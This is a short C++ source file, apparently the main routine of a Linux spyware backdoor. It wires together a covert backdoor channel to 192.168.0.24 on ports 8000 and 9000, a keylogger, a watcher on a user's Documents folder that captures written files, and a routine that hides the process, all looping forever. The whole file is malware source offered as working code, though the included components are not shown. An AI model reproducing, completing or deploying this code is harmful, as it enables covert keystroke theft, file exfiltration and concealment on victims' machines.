
#include "covert_channel/backdoor_channel.h"
#include "file_watcher/file_watcher.h"
#include "keylogger/keylogger.h"
#include "hiding/includes/hiding.h"
#include <thread>

void spawn() {
    Backdoor_Channel ch;
    Key_Logger kl(ch);
    File_Watcher fw(ch);
    File_Watcher pw(ch);

    std::thread bd_thread(&Backdoor_Channel::start, &ch, "lo", 8000, 9000,
                          "192.168.0.24");
    std::thread kl_thread(&Key_Logger::start, &kl);
    std::thread fw_thread(&File_Watcher::start, &fw, "/home/dimitry/Documents",
                          IN_CLOSE_WRITE);
    std::ostringstream oss;
    oss << "/proc/" << getpid() << "/status";

    pw.watch(oss.str().c_str(), IN_ACCESS);
    bd_thread.join();
    kl_thread.join();
    fw_thread.join();
}

int main(int argc, char** argv) {
    while (1) {
        procscan_hide(argv);
        spawn();
    }
}
